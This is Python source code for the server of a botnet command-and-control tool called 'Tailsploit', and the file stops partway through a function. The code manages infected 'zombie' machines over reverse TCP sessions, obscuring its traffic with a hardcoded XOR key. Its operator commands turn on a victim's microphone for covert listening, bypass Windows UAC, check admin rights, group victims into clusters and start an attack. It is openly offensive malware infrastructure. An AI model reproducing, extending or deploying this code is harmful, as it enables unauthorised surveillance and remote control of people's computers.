import socket
import threading
import time
import sys
from pyspin.spin import Box1, Spinner
from colorama import Back, Style, Fore
import os
import re
import json
import requests
import psutil
import datetime
import ctypes
import folium
import select
import platform
import argparse

script_dir = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.abspath(os.path.join(script_dir, os.pardir, os.pardir))
sys.path.insert(0, project_root)

from lib.authentication.hashkey import GenerateHashkeyRequest

from lib.tsfwebhook.tsf_webhook import (
    TailsploitIncomingConnectionRegularClient,
    TailsploitDiscordCommand,
    TailsploitIncomingConnectionAdminClient,
    TailsploitIncomingConnectionAdminClientAuthorized,
    TailsploitIncomingConnectionAdminClientRejectedTokenAlreadyInUse,
    TailsploitIncomingConnectionAdminClientRejectedTokenNotValid,
    TailsploitIncomingConnectionAdminClientRejectedTokenRevoked,
    TailsploitWebRequestFirstIndex,
    TailsploitWebRequestSecondIndex
)

TailsploitCommandHandling = {}

PERMISSION_HIERARCHY = {
    "user": 1,
    "admin": 2,
    "root": 3
}

# Decorator for handling static method commands
def StaticMethodCommandHandler(command_string, min_rank, is_available=True, reverse_shell_flag=None):
    def DecoratorMethod(command_func):
        def StaticWrapper(self, admin_socket, admin_username, handleAdminShellCommands, *args):
            admin_info = self.TAILSPLOIT_ADMINS_SESSION.get(admin_username)
            if admin_info is not None:
                admin_permission = admin_info['permission']
                admin_rank = PERMISSION_HIERARCHY.get(admin_permission, 0)

            if admin_rank < min_rank:
                permission_denied_response = f"[{Fore.RED}!{Style.RESET_ALL}] Permission denied. You do not have sufficient permission to execute this command."
                permission_denied_response_xored = self.handleXOREncryption(permission_denied_response.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(permission_denied_response_xored)
                return
            
            if is_available:
                if reverse_shell_flag:
                    if "--FLAG_REVERSE_SHELL_INFO" in handleAdminShellCommands:
                        command_func(self, admin_socket, admin_username, handleAdminShellCommands, *args)
                    else:
                        WarningSession = f"{Fore.YELLOW}[*]{Style.RESET_ALL} You need to be in a reverse TCP Session in order to execute this command."
                        WarningSessionXOR = self.handleXOREncryption(WarningSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                        admin_socket.send(WarningSessionXOR)
                else:
                    if "--FLAG_REVERSE_SHELL_INFO" in handleAdminShellCommands:
                        WarningSession = f"{Fore.YELLOW}[*]{Style.RESET_ALL} You need to exit the current reverse TCP Session in order to execute this command."
                        WarningSessionXOR = self.handleXOREncryption(WarningSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                        admin_socket.send(WarningSessionXOR)
                    else:
                        command_func(self, admin_socket, admin_username, handleAdminShellCommands, *args)

            else:
                unavailable_command_response = f"[{Fore.RED}!{Style.RESET_ALL}] '{command_string}' command is not available right now."
                unavailable_command_response_xored = self.handleXOREncryption(unavailable_command_response.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(unavailable_command_response_xored)
        
        TailsploitCommandHandling[command_string] = StaticWrapper
        return command_func
    return DecoratorMethod

class ServerShell:
    def __init__(self):
        self.TAILSPLOIT_ZOMBIES = {}
        self.TAILSPLOIT_ADMINS_SESSION = {}  
        self.TARGET_CLIENT = None
        self.DISCONNECTED_ZOMBIES = set()
        self.TRAFFIC_ENCRYPTION_TOKEN = b'AUTHORIZED?BOTNET=ENCRYPTIONTYPE?XOR'
        self.TAILSPLOIT_LOG_WEBOOK = False
        self.TailsploitCommandHandler = {}
        self.SESSION_PERMISSION = ""
        self.TAILSPLOIT_THREAD_LOCK_ZOMBIES = threading.Lock()
        self.CLUSTERS_SESSION = {}
        self.TailsploitServerConfigurationJSON()

    def TailsploitServerConfigurationJSON(self):
        with open("../../lib/configuration/tsf_config.json", "r") as TailsploitJSONConfig:
            data = json.load(TailsploitJSONConfig)

            TailsploitServerConfigurationFlag = "TAILSPLOIT_SERVER_CONFIGURATION"
            TailsploitServerAuthorizationFlag = "TAILSPLOIT_SERVER_AUTHORIZATION"
            TailsploitServerTokenFlag = "TAILSPLOIT_SERVER_TOKEN"

            # Server Configuration
            self.TSF_SERVER_IP = data[f"{TailsploitServerConfigurationFlag}"]["TSF_SERVER_IP_CONFIG"]
            self.TSF_SERVER_PORT = data[f"{TailsploitServerConfigurationFlag}"]["TSF_SERVER_PORT_CONFIG"]
            self.TSF_SERVER_MAX_ADMINS_CONN = data[f"{TailsploitServerConfigurationFlag}"]["TSF_SERVER_MAX_ADMINS_CONN"]
            
            # Server Authorization
            self.TSF_MFA_SESSION_STATE = data[f"{TailsploitServerAuthorizationFlag}"]["TSF_MFA_SESSION_STATE"]
            self.TSF_MFA_SESSION_PASSWORD = data[f"{TailsploitServerAuthorizationFlag}"]["TSF_MFA_SESSION_PASSWORD"]
            self.TSF_SESSION_TIMEOUT = data[f"{TailsploitServerAuthorizationFlag}"]["TSF_SESSION_TIMEOUT"]
            self.TSF_SESSION_TIMEOUT_TIME = data[f"{TailsploitServerAuthorizationFlag}"]["TSF_SESSION_TIMEOUT_TIME"]

            # Server Token
            self.TSF_TOKEN_DEFAULT_LENGTH = data[f"{TailsploitServerTokenFlag}"]["TSF_TOKEN_DEFAULT_LENGTH"]

    def handleXOREncryption(self, content_data, key_traffic):
        key_traffic = key_traffic * (len(content_data) // len(key_traffic)) + key_traffic[:len(content_data) % len(key_traffic)]
        return bytes([byte ^ key_byte for byte, key_byte in zip(content_data, key_traffic)])

    def TailsploitTokenHandler(self, key):
        with open('../../lib/authentication/hash-token.json', 'r') as key_file:
            self.TOKEN_AUTH = json.load(key_file)

        for key_info in self.TOKEN_AUTH:
            if key_info['token'] == key:
                self.SESSION_PERMISSION = key_info["permission"]
                if key_info.get('status') == 'active':
                    for admin_info in self.TAILSPLOIT_ADMINS_SESSION.values():
                        if admin_info["token"] == key:
                            return "--FLAG_TOKEN_ALREADY_IN_USE"
                    return
                else:
                    return "--FLAG_TOKEN_REVOKED"
        return "--FLAG_TOKEN_NOT_VALID"


    #-------------------- ATTACK METHOD ----------------------#

    @StaticMethodCommandHandler("attacktcp", is_available=True, reverse_shell_flag=False, min_rank=2)
    def TailsploitTCPAttack(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        print(f"{Back.RED} ! {Style.RESET_ALL} Administrator \x1B[4m{admin_username}\x1B[0m Started an {Fore.RED}attack{Style.RESET_ALL} on → {Fore.YELLOW}0.0.0.0:5050{Style.RESET_ALL}")



    #-------------------- CLUSTERS METHOD ----------------------#

    @StaticMethodCommandHandler("create_cluster", is_available=True, min_rank=2, reverse_shell_flag=False)
    def TailsploitCreateCluster(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        if len(args) < 4 or args[0] != "-n" or args[2] != "-s":
            usage_message = "Usage: create_group -n <group_name> -s <session_ips:session_ports>"
            usage_message_xor = self.handleXOREncryption(usage_message.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(usage_message_xor)
            return

        group_name = args[1]
        session_ips = args[3:]

        if group_name not in self.CLUSTERS_SESSION:
            valid_sessions = []

            for session_address in session_ips:
                try:
                    session_ip, session_port = session_address.split(":")
                    session_tuple = (session_ip, int(session_port))

                    if session_tuple in self.TAILSPLOIT_ZOMBIES:
                        valid_sessions.append(session_tuple)
                    else:
                        error_message = f"{Fore.RED}[*]{Style.RESET_ALL} Session {Fore.RED}{session_address}{Style.RESET_ALL} is not connected."
                        error_message_xor = self.handleXOREncryption(error_message.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                        admin_socket.send(error_message_xor)
                        return
                except ValueError:
                    error_message = f"{Fore.RED}[-]{Style.RESET_ALL} Invalid session address: {Fore.RED}{session_address}{Style.RESET_ALL}. Use the format <IP:PORT>."
                    error_message_xor = self.handleXOREncryption(error_message.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(error_message_xor)
                    return

            if valid_sessions:
                self.CLUSTERS_SESSION[group_name] = valid_sessions

                cluster_created = f"{Fore.GREEN}[*]{Style.RESET_ALL} Cluster '{Fore.GREEN}{group_name}{Style.RESET_ALL}' has been created with {len(valid_sessions)} active sessions."
                print(f"{Fore.GREEN}[*]{Style.RESET_ALL} New Cluster '{Fore.GREEN}{group_name}{Style.RESET_ALL}' With {len(valid_sessions)} Active Sessions Has Been Created By \x1B[4m{admin_username}\x1B[0m")
                cluster_created_xor = self.handleXOREncryption(cluster_created.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(cluster_created_xor)
            else:
                clu = "None of the provided sessions are connected."
                clu_xor = self.handleXOREncryption(clu.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(clu_xor)
        else:
            cluster_exists = f"{Fore.RED}[-]{Style.RESET_ALL} Cluster '{Fore.RED}{group_name}{Style.RESET_ALL}' already exists. Please choose a diffrent cluster name. (type 'cluster' for more informations)"
            cluster_exists_xor = self.handleXOREncryption(cluster_exists.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(cluster_exists_xor)

    @StaticMethodCommandHandler("cluster", is_available=True, min_rank=2, reverse_shell_flag=False)
    def TailsploitViewCluster(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        if not self.CLUSTERS_SESSION:
            ClusterEmpty = f"{Fore.YELLOW}[*]{Style.RESET_ALL} No clusters are created yet. ('create_cluster' for more informations)"
            ClusterEmtpyXOR = self.handleXOREncryption(ClusterEmpty.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(ClusterEmtpyXOR)
        else:
            total_clusters = len(self.CLUSTERS_SESSION)
            cluster_info = "\n\n".join([f"Cluster Name: {Fore.GREEN}{name}{Style.RESET_ALL}\nCluster Sessions IP:PORTs: {' | '.join(f'{Fore.GREEN}{ip}:{port}{Style.RESET_ALL}' for ip, port in ips)}\nActive Sessions: {Fore.GREEN}{len(ips)}{Style.RESET_ALL}" for name, ips in self.CLUSTERS_SESSION.items()])
            cluster_info = f"{Fore.GREEN}[*]{Style.RESET_ALL} Total Clusters: {total_clusters}\n\n{cluster_info}"
            cluster_info_xor = self.handleXOREncryption(cluster_info.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(cluster_info_xor)

    @StaticMethodCommandHandler("delete_cluster", is_available=True, min_rank=2, reverse_shell_flag=False)
    def TailsploitDeleteCluster(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        if len(args) != 2 or args[0] != "-n":
            usage_message = "Usage: delete_cluster -n <cluster_name>"
            usage_message_xor = self.handleXOREncryption(usage_message.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(usage_message_xor)
            return

        cluster_name = args[1]

        if cluster_name in self.CLUSTERS_SESSION:
            del self.CLUSTERS_SESSION[cluster_name]
            ClusterDeleted = f"{Fore.GREEN}[*]{Style.RESET_ALL} Cluster '{Fore.GREEN}{cluster_name}{Style.RESET_ALL}' has been deleted."
            ClusterDeletedXOR = self.handleXOREncryption(ClusterDeleted.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(ClusterDeletedXOR)
        else:
            ClusterNotFound = f"{Fore.RED}[-]{Style.RESET_ALL} Cluster '{Fore.RED}{cluster_name}{Style.RESET_ALL}' does not exist."
            ClusterNotFoundXOR = self.handleXOREncryption(ClusterNotFound.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(ClusterNotFoundXOR)

    @StaticMethodCommandHandler("task", is_available=True, reverse_shell_flag=False, min_rank=1)
    def handleViewThreadCommand(self, admin_socket, handleAdminShellCommands, *args):
        thread_info = f"[{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Running Thread / Job Information(s):\n"
        thread_info += f"[{Fore.GREEN}*{Style.RESET_ALL}] Total Thread(s): {Fore.GREEN}{threading.active_count() - 1}{Style.RESET_ALL}\n\n"        
        total_threads = threading.active_count() - 1

        # Get CPU usage for each running thread (approximation)
        for index, (thread_id, thread) in enumerate(threading._active.items()):
            if thread != threading.main_thread():
                thread_info += f"* Thread Name: {thread.name}\n"
                thread_info += f"* Thread Status: {Fore.GREEN}Running{Style.RESET_ALL}\n"
                try:
                    cpu_usage = self.get_thread_cpu_usage(thread)
                    thread_info += f"* CPU Usage: {Fore.YELLOW}{cpu_usage:.2f}{Style.RESET_ALL}%\n"
                except psutil.NoSuchProcess:
                    thread_info += "* CPU Usage: Not available (thread may have completed)\n"
                
                if index < total_threads - 1: 
                    thread_info += "\n━━━━━━━━━━━━━━\n\n"
                elif index == total_threads - 1:
                    thread_info += "\n━━━━━━━━━━━━━━\n\n"
            
        thread_info_xored = self.handleXOREncryption(thread_info.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
        admin_socket.send(thread_info_xored)

    def get_thread_cpu_usage(self, thread):
        thread_id = thread.ident
        process = psutil.Process()
        process_cpu_percent = process.cpu_percent(interval=0.1)
        return process_cpu_percent
    
    @StaticMethodCommandHandler("target", is_available=True, min_rank=2, reverse_shell_flag=False)
    def handleTargetCommand(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        if len(args) < 1:
                InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'target  <IP>:<PORT>'."
                InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(InvalidFormatXOR)
                return
        FormattingArgsAddr = f"{args[0]}"
        try:
            client_ip, client_port = FormattingArgsAddr.split(":")
            client_port = int(client_port)
            client_addr = (client_ip, client_port)

            if client_addr in self.TAILSPLOIT_ZOMBIES:
                self.TARGET_CLIENT = client_addr
                FlagReverseShellConnected = f"{client_ip}:{client_port} --FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?CONNECTED"
                FlagReverseShellConnectedXOR = self.handleXOREncryption(FlagReverseShellConnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(FlagReverseShellConnectedXOR)
                print(f"{Fore.GREEN}[*]{Style.RESET_ALL} (Reverse TCP) Administrator \x1B[4m{admin_username}\x1B[0m Targeting → {Fore.YELLOW}{client_ip}:{client_port}{Style.RESET_ALL}")

            else:
                FlagReverseShellNotFound = f"--FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?NOTFOUND"
                FlagReverseShellNotFoundXOR = self.handleXOREncryption(FlagReverseShellNotFound.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(FlagReverseShellNotFoundXOR)
        except: 
            InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'target  <IP>:<PORT>'."
            InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(InvalidFormatXOR)

    @StaticMethodCommandHandler("listen", is_available=True, min_rank=2, reverse_shell_flag=True)
    def TailsploitListenTargetMicrophone(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
            target_ip, target_port = args[1].split(":")
            target_client_addr = (target_ip, int(target_port))
            target_socket = self.TAILSPLOIT_ZOMBIES.get(target_client_addr)
            if target_socket:
                thread_target = "LISTENING_MICROPHONE"
                try:
                    TargetXOR = self.handleXOREncryption(thread_target.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    target_socket.send(TargetXOR)
                    PrepareThread = "--FLAG_AUDIO_STREAMING_STARTED"
                    PrepareThreadXOR = self.handleXOREncryption(PrepareThread.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(PrepareThreadXOR)
                except Exception as e:
                    ErrorPing = f"[-] Error, user may be disconnected"
                    ErrorPingXOR = self.handleXOREncryption(ErrorPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(ErrorPingXOR)
            else:
                UserDisconnected = f"[{Fore.RED}-{Style.RESET_ALL}] Error, cannot connect to this target (Target may be disconnected)"
                UserDisconnectedXOR = self.handleXOREncryption(UserDisconnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(UserDisconnectedXOR)
        else:
            HandleExcept = f"  : {args[0]}"
            HandleExceptXOR = self.handleXOREncryption(HandleExcept.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(HandleExceptXOR)

    @StaticMethodCommandHandler("map", is_available=False, min_rank=1, reverse_shell_flag=False)
    def TailsploitMapLayers(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        print("[*] Generating tailsploit data map layers...")
        ConnListData = f"--FLAG_TAILSPLOIT_CONN_CLIENT_MAP:{[client_addr[0] for client_addr in self.TAILSPLOIT_ZOMBIES.keys()]}"
        ConnListDataXOR = self.handleXOREncryption(ConnListData.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
        admin_socket.send(ConnListDataXOR)
        print("[*] Done, data has been save in ../../tmp/tailsploit-bot-ipmap-layer-html")

    @StaticMethodCommandHandler("bypassuac", is_available=True, min_rank=2, reverse_shell_flag=True)
    def TailsploitBypassUAC(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
            target_ip, target_port = args[1].split(":")
            target_client_addr = (target_ip, int(target_port))
            target_socket = self.TAILSPLOIT_ZOMBIES.get(target_client_addr)
            if target_socket:
                thread_target = "BYPASS_UAC"
                try:
                    TargetXOR = self.handleXOREncryption(thread_target.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    target_socket.send(TargetXOR)
                except Exception as e:
                    ErrorPing = f"[-] Error, user may be disconnected"
                    ErrorPingXOR = self.handleXOREncryption(ErrorPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(ErrorPingXOR)
            else:
                UserDisconnected = f"[{Fore.RED}-{Style.RESET_ALL}] Error, cannot connect to this target (Target may be disconnected)"
                UserDisconnectedXOR = self.handleXOREncryption(UserDisconnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(UserDisconnectedXOR)
        else:
            HandleExcept = f"  : {args[0]}"
            HandleExceptXOR = self.handleXOREncryption(HandleExcept.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(HandleExceptXOR)

    @StaticMethodCommandHandler("isadmin", is_available=True, min_rank=2, reverse_shell_flag=True)
    def TailsploitIsAdminPrivilege(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
            target_ip, target_port = args[1].split(":")
            target_client_addr = (target_ip, int(target_port))
            target_socket = self.TAILSPLOIT_ZOMBIES.get(target_client_addr)
            if target_socket:
                thread_target = "IS_ADMIN"
                try:
                    TargetXOR = self.handleXOREncryption(thread_target.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    target_socket.send(TargetXOR)
                except Exception as e:
                    ErrorPing = f"[-] Error, user may be disconnected"
                    ErrorPingXOR = self.handleXOREncryption(ErrorPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(ErrorPingXOR)
            else:
                UserDisconnected = f"[{Fore.RED}-{Style.RESET_ALL}] Error, cannot connect to this target (Target may be disconnected)"
                UserDisconnectedXOR = self.handleXOREncryption(UserDisconnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(UserDisconnectedXOR)
        else:
            HandleExcept = f"  : {args[0]}"
            HandleExceptXOR = self.handleXOREncryption(HandleExcept.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(HandleExceptXOR)
    
    @StaticMethodCommandHandler("stoplisten", is_available=True, min_rank=2, reverse_shell_flag=True)
    def TailsploitListenTargetMicrophone(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
            target_ip, target_port = args[1].split(":")
            target_client_addr = (target_ip, int(target_port))
            target_socket = self.TAILSPLOIT_ZOMBIES.get(target_client_addr)
            if target_socket:
                thread_target = "STOP_MICROPHONE"
                try:
                    TargetXOR = self.handleXOREncryption(thread_target.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    target_socket.send(TargetXOR)
                    StopThreadListen = "--FLAG_AUDIO_STREAMING_STOPPED"
                    StopThreadListenXOR = self.handleXOREncryption(StopThreadListen.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(StopThreadListenXOR)
                except Exception as e:
                    ErrorPing = f"[-] Error, user may be disconnected"
                    ErrorPingXOR = self.handleXOREncryption(ErrorPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(ErrorPingXOR)
            else:
                UserDisconnected = f"[{Fore.RED}-{Style.RESET_ALL}] Error, cannot connect to this target (Target may be disconnected)"
                UserDisconnectedXOR = self.handleXOREncryption(UserDisconnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(UserDisconnectedXOR)
        else:
            HandleExcept = f"  : {args[0]}"
            HandleExceptXOR = self.handleXOREncryption(HandleExcept.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(HandleExceptXOR)
    
    @StaticMethodCommandHandler("killsession", is_available=True, min_rank=2, reverse_shell_flag=True)
    def TailsploitKillCurrentSessionTCP(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        try:
            if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
                try:
                    KillingSession = "--FLAG_KILL_SESSION_REVERSE_TCP_SUCCESS"
                    KillingSessionXOR = self.handleXOREncryption(KillingSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(KillingSessionXOR)
                except Exception as e:
                    ErrorClosingSession = f"{Fore.RED}[-]{Style.RESET_ALL} An error occured while trying to close the current session."
                    ErrorClosingSessionXOR = self.handleXOREncryption(ErrorClosingSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(ErrorClosingSessionXOR)
            else:
                WarningSession = f"{Fore.YELLOW}[*]{Style.RESET_ALL} You need to be in a reverse TCP Session in order to kill the session."
                WarningSessionXOR = self.handleXOREncryption(WarningSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(WarningSessionXOR)
        except:
            WarningSession = f"{Fore.YELLOW}[*]{Style.RESET_ALL} You need to be in a \x1B[4mReverse TCP Session\x1B[0m in order to kill the session."
            WarningSessionXOR = self.handleXOREncryption(WarningSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(WarningSessionXOR)

    def TailsploitPrivilegeSessionHandler(self, admin_socket, admin_addr, admin_username):
        while True:
            try:
                defaultXOR = admin_socket.recv(4096)
                handleAdminShellCommands = self.handleXOREncryption(defaultXOR, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
                print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Command From Administrator \x1B[4m{admin_username}\x1B[0m : {handleAdminShellCommands}")

                #TailsploitDiscordCommand(admin_username, handleAdminShellCommands)

                AdminShellSplitCommand = handleAdminShellCommands.split()
                self.admin_socket = admin_socket

                self.TIME_MS = time.time() * 1000  # Record start time in milliseconds
                
                # Check if the command exists in the tailsploit_command_handler dictionary
                CommandFunction = TailsploitCommandHandling.get(handleAdminShellCommands)
                if handleAdminShellCommands.startswith("target"):
                    SetCustomMethod = "target" 
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                elif handleAdminShellCommands.startswith("kick"):
                    SetCustomMethod = "kick"
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                elif handleAdminShellCommands.startswith("generate-token"):
                    SetCustomMethod = "generate-token"
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                elif handleAdminShellCommands.startswith("ping"):
                    SetCustomMethod = "ping" 
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                elif handleAdminShellCommands.startswith("listen"):
                    SetCustomMethod = "listen" 
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                elif handleAdminShellCommands.startswith("stoplisten"):
                    SetCustomMethod = "stoplisten" 
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                elif handleAdminShellCommands.startswith("killsession"):
                    SetCustomMethod = "killsession"
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                elif handleAdminShellCommands.startswith("isadmin"):
                    SetCustomMethod = "isadmin"
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                elif handleAdminShellCommands.startswith("bypassuac"):
                    SetCustomMethod = "bypassuac"
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                elif handleAdminShellCommands.startswith("search"):
                    SetCustomMethod = "search"
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                elif handleAdminShellCommands.startswith("create_cluster"):
                    SetCustomMethod = "create_cluster"
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                elif handleAdminShellCommands.startswith("delete_cluster"):
                    SetCustomMethod = "delete_cluster"
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])

                else:
                    if CommandFunction:
                        # If the command exists, call the associated method and pass admin_socket explicitly
                        CommandFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                    else:
                        if "--FLAG_MESSAGE_MODE_ADMN" in handleAdminShellCommands:
                            self.ForwardToAllAdminSocket(handleAdminShellCommands, admin_username)
                        else:
                            CommandNotExist = "This command does not exist. (-help / -h)"
                            CommandNotExistXOR = self.handleXOREncryption(CommandNotExist.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                            admin_socket.send(CommandNotExistXOR)

            except ConnectionAbortedError:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Tailsploit Admin Session \x1B[4m{admin_username}\x1B[0m Disconnected.")
                del self.TAILSPLOIT_ADMINS_SESSION[admin_username]
                self.admin_socket = None
                break

            except ConnectionResetError:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Tailsploit Admin Session \x1B[4m{admin_username}\x1B[0m Disconnected.")
                del self.TAILSPLOIT_ADMINS_SESSION[admin_username]
                self.admin_socket = None
                break

    @StaticMethodCommandHandler("sessions", is_available=True, min_rank=1, reverse_shell_flag=False)
    def handleZombiesListCommand(self, admin_socket, handleAdminShellCommands, *args):
        alive_bots = len(self.TAILSPLOIT_ZOMBIES)
        dead_bots = len(self.DISCONNECTED_ZOMBIES)
        total_bots = alive_bots + dead_bots

        alive_dead_line = f"Alive Bots: {Fore.RED}{alive_bots}{Style.RESET_ALL} ┃ Dead Bots: {Fore.RED}{dead_bots}{Style.RESET_ALL} ┃ Total Bots: {Fore.RED}{total_bots}{Style.RESET_ALL}"

        formatZombiesList = f"""
CID        Desktop Name        Bind Address           Operating System        Protocol        Status (+/-) 
======     ================    ===================    ====================    ============    ============
\n"""

        client_info_list = []
        no_client_info = []
        for i, (client_addr, client_socket) in enumerate(self.TAILSPLOIT_ZOMBIES.items(), start=1):
            system_info = platform.system()
            if system_info == "Windows":
                architecture = platform.architecture()
                formatted_arch = f"{system_info}/{architecture[0]}"
            else:
                machine = platform.machine()
                formatted_arch = f"{system_info}/{machine}"


            ip_address, port = client_addr
            port = str(port)
            desktop_name = "DESKTOP-WNQ91AQ"
            protocol = "TCP"
            formatted_ip = f"{ip_address}:{port}"

            def format_column(value, max_width):
                if len(value) > max_width:
                    return f"{value[:max_width - 3]}..."
                else:
                    return value

            
            client_info = f" {i:<5}    {format_column(desktop_name, 17):17}    {format_column(formatted_ip, 21):21}  {format_column(formatted_arch, 20):20}    {format_column(protocol, 3):3}             {Fore.GREEN}[ONLINE]{Style.RESET_ALL}"
            client_info_list.append(client_info)

        NONE_AVAILABLE_BOTS = "[*] Any Tailsploit connected session detected, check (Generate a Payload)."
        no_client_info.append(NONE_AVAILABLE_BOTS)

        if len(self.TAILSPLOIT_ZOMBIES) <= 0:
            NewFormatZombies = formatZombiesList + "\n" + "\n".join(no_client_info) + "\n"
        else:
            NewFormatZombies = formatZombiesList + "\n" + "\n".join(client_info_list) + "\n"
        
